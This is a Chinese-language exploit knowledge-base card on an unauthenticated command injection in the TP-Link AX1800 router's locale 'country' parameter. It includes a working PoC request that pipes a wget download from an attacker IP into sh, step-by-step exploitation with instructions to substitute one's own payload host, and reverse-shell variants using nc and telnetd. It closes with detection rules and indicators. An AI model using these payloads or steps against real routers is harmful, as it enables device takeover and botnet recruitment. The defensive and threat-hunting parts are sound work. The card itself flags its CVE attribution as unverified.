---
id: iot-tplink-ax1800-luci-locale-country-command-injection
title: TP-Link AX1800 /cgi-bin/luci/;stok=/locale country 参数未授权命令注入：popen 拼接 + wget|sh 下载执行（文章推断 CVE-2023-27359）
type: scenario
domain: iot
path: iot
technique: tplink-ax1800-locale-country-popen-command-injection
tags:
- iot
- router
- tplink
- command-injection
- unauthenticated
- rce
- botnet
- 1day
cve:
- CVE-2023-27359
severity: critical
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V286
  verified_at: '2026-11-08T05:22:58+08:00'
  notes: 已对照原文与12张图核对：图07 原始请求 GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.146.23.249%2Ft+-O-+|+sh%60) 与卡内 PoC 一致（含空 stok、%3E/%60 解码为 >/反引号）；图03/04/06 Phobos IOC 表（netsh/wbadmin、RSA+AES、样本 hash）、图08 31.220.1.83 微步恶意标注、图11 攻击者画像（黑灰产/投机主义1day/利用IoT 1day部署僵尸网络）、图12 样本 22443413.../MD5 a32b85.../SH 432B 均与卡片一致。CVE 归属：原文仅写『推断是 CVE-2023-27359 相关漏洞』，卡片标题与变体段已标注为文章推断，并指出该端点与公开的 TP-Link Archer AX21 CVE-2023-1389 特征一致；本机离线无法访问 NVD/CVE 站点复核，未能确认 27359 与 1389 的准确归属，引用前需外部复核。未验证点：未复跑请求；原文无受影响版本区间，未设 affected_versions；frontmatter 无 sources/source_url。dup-scan pair 78 对方为 D-Link DIR-820L 登录后 ping_addr 换行注入 CVE-2022-34974，产品/入口/权限/载荷均不同，保留两张。
url: /docs/iot/iot-tplink-ax1800-luci-locale-country-command-injection/
draft: false
kb_aliases:
- CVE-2023-27359
- /cgi-bin/luci/;stok=/locale
- cgi-bin/luci;stok=/locale
- form=country
- operation=write&country
- TP-Link Archer AX21
---

## 一句话结论

TP-Link AX1800 的 Web 管理接口 `/cgi-bin/luci/;stok=/locale` 在 `form=country` 的写入流程中把 `country` 参数直接交给 `popen()` 执行，空 `stok` 即可到达该逻辑，未认证攻击者用 `$()` 或反引号注入 shell 命令；野外样本以 `country=$(id>`wget http://103.146.23.249/t -O- | sh`)` 让设备下载并执行远程脚本，属于 IoT 1day 批量扫描投毒。

## 原理

- 文章对一个真实告警请求 `/cgi-bin/luci/;stok=/locale?form=country` 的分析：该 URL 不是常规管理请求，`;stok=` 为空仍能进入 locale 处理分支；`form=country` 且 `operation=write` 时，`country` 的值被传入 `popen()`。
- `popen()` 内部用 `/bin/sh -c` 解析命令字符串，只要 `country` 未做字符白名单，`$()`、反引号、`|`、`;`、`&` 都会被 shell 解释，形成未授权命令注入；`httpd` 在嵌入式设备上通常以 root 运行，注入命令即 root 权限执行，可植入 bot、后门或横向扫描工具。
- 注入串在 URL 中被百分号编码：`%3E`=`>`、`%60`=反引号、`+`=空格、`%3A`=`: `、`%2F`=`/`。解码后的 `country` 值为
  `$(id>`wget http://103.146.23.249/t -O- | sh`)`。
- 该值的执行效果：shell 先做命令替换，反引号内的 `wget http://103.146.23.249/t -O-` 把远程脚本内容抓到标准输出，再通过管道交给 `sh` 执行（`-O-` 表示输出到 stdout）；外层 `id>` 把 `id` 的输出重定向到一个以该命令替换结果命名的文件，属于拼接痕迹，不影响 `wget|sh` 已执行。因此实际危害是“从攻击者资源站下载 shell 脚本并在设备上执行”。
- 攻击者不需要任何凭据；请求参数本身即可完成投递，这是 IoT 1day 扫描器（文章判断为黑灰产、投机主义 1day 利用）批量感染设备、搭建僵尸网络的典型载荷形态。

## 触发条件

- 目标为 TP-Link AX1800（Archer AX21 系列，文章按此型号描述）且 Web 管理面可达，存在 `/cgi-bin/luci/;stok=/locale` 路由。
- 设备固件版本对应文章所述漏洞（原文未给出具体版本区间）；`form=country` 的 `operation=write` 分支把 `country` 拼进 `popen()`，且未按 ISO 国家码做白名单校验。
- `;stok=` 为空仍能通过路由/鉴权到达 handler（文章样本即未认证请求）。
- 设备 shell 支持 `$()`、反引号与管道（BusyBox sh 默认支持）；出网可达攻击者脚本服务器，或可用 DNS/带外通道替代。

## 利用步骤

1. 探测 `GET /cgi-bin/luci/;stok=/locale?form=country` 是否可达（返回 locale 相关页面/非 404），确认目标为受影响的 TP-Link AX1800 固件。
2. 先做无害验证：在 `country` 中注入 `$(id)`、`` `id` `` 或带外命令（如 `$(wget http://<dnslog>/x)`），观察是否触发 `popen`；由于响应不一定回显 `popen` 的 stdout，优先用 DNS/HTTP 带外确认。
3. 投递：把 `country` 设为 ``$(id>`wget http://<attacker>/t -O- | sh`)``（文章样本），或简化成 `$(wget http://<attacker>/t -O- | sh)`；远程 `t` 为 sh 脚本，可继续按 `uname -m` 下载对应架构的 bot。
4. 脚本落地后由设备自行执行，攻击者通过 C2 接管；文章样本的资源站随后可被用于同源攻击者拓线与样本排查。
5. 清理痕迹：检查设备上的临时文件、cron/rc.local 变更与新增外连。

## PoC

文章图 7 捕获的原始请求（资源站 IP 与命令保持原样）：

```http
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.146.23.249%2Ft+-O-+|+sh%60) HTTP/1.1
Host: <target>
```

等价的 URL 解码结果：

```
country=$(id>`wget http://103.146.23.249/t -O- | sh`)
```

复跑时把 `103.146.23.249/t` 换成自己的脚本地址；最小带外验证可先用 `country=%24%28id%29`（`$(id)`）或在 `$()` 内放 `wget http://<dnslog>/$(id)` 观察回连。文章中未给出响应回显，命令执行结果以带外或设备侧进程为准。

## 变体与关联

- **CVE 归属线索**：文章说“推断是 CVE-2023-27359 相关漏洞”，该编号是文章的分析推断而非原文引用公告；从 `/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=` 与 `popen` 这一入口来看，与公开披露的 TP-Link Archer AX21（AX1800）命令注入 CVE-2023-1389 的特征一致，引用前应复核 CVE 归属。本卡 `cve` 字段按文章表述记录，confidence 因此标为 medium。
- **命令分隔符变体**：`$()`、反引号、`;`、`|`、`&&` 均可尝试；被过滤时可用 `$IFS`、`${IFS}`、base64+sh 等方式变形。
- **投递工具变体**：`wget`/`curl`/`tftp`/`nc` 下载执行；也可直接 `telnetd -l /bin/sh -p <port>`、`nc -e /bin/sh` 反弹，或写 Web 目录落地脚本。
- **同族 IoT 路由器命令注入**：见 [[iot-dlink-di8100-msp-info-htm-cmd-command-injection]]、[[iot-dlink-di8100-upgrade-filter-asp-path-command-injection]]、[[iot-tenda-ac15-goform-telnet-command-injection]]；共同模式是 Web 参数未过滤直接进入 `system`/`popen`。
- **威胁狩猎用法**：文章用 payload 中的固定资源站 IP/命令特征把多起告警聚到同一攻击者，并把 `cgi-bin/luci/;stok=/locale` 作为全网测绘特征；防守方可据此把“异常 country 值 + wget|sh”作为本地检测规则。

## 检测与防御

- **固件**：升级到厂商修复版本（TP-Link 已针对 Archer AX21 的 country 命令注入发布修复）；无法升级时把管理面限制在内网、关闭 WAN 侧远程管理。
- **WAF/IDS**：对 `/cgi-bin/luci/;stok=/locale` 的 `country` 参数匹配 `%24%28`、`%60`、`wget`、`curl`、`tftp`、`|sh`、`;` 等特征；重点关注 `operation=write` 且 `country` 不是两位国家码的请求。
- **设备侧检测**：审计 `httpd` 派生的 `sh`/`wget`/`curl` 子进程、`/tmp` 新增脚本、cron/rc.local 变更、异常监听端口与外连；文章样本中资源站为 `103.146.23.249`（托管 `t` 脚本）、扫描源 `31.220.1.83`（荷兰 Amaru Technology Ltd，被情报标为扫描/傀儡机/漏洞利用），样本 `22443413af2887d90926da64a2c8872bf4ecbc90cdd649a23a57dd60a0e3af2`（MD5 `a32b85f125e21b46d66393a1081ab9e3`，SH，432B）。
- **开发侧**：`popen` 前不拼接用户输入，改为 `execve` 参数数组；`country` 按 ISO 3166-1 白名单校验后再使用。
